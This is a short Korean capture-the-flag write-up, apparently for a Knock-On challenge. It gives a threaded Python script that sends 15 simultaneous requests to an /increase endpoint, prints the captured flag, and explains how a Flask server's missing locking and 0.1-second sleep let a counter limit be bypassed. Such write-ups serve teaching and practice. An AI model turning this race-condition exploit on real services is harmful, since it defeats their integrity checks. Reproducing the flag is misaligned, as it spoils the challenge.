# 라업
``` python
import threading
import requests


def refund():
    url = f"http://ssh.knock-on.org:10015/increase"
    res = requests.get(url=url)
    if "Success!!" in res.text:
        print(res.text)


for i in range(15):
    t = threading.Thread(target=refund)
    t.start()

```

# 플래그
K0{Cl1ck_m00oor3_F4st3r_t0_3XPL01T!!!}

# 설명
Race Condition을 이용한 무결성 이슈를 이용한 문제

코드를 보면 `app.run(host="0.0.0.0", port=8000, threaded=True)` 이런 표현이 있는데, 서버가 멀티스레딩을 지원한다는 의미
멀티 스레딩이 가능하므로 하나의 요청을 처리하는 중에 다른 요청이 오면 리소스를 lock하지 않고 수정 사항을 그대로 반영함
`if counter < 15:` 으로 counter가 15 임을 체크해 보이지만 `/increase` 엔드 포인트에서 0.1초 sleep이 있으므로
동시에 요청이 오고 처리(sleep) 중에는 아직 counter가 오르지 않은 상태이므로 논리적으로 모순되는 상황이 발생할 수 있음
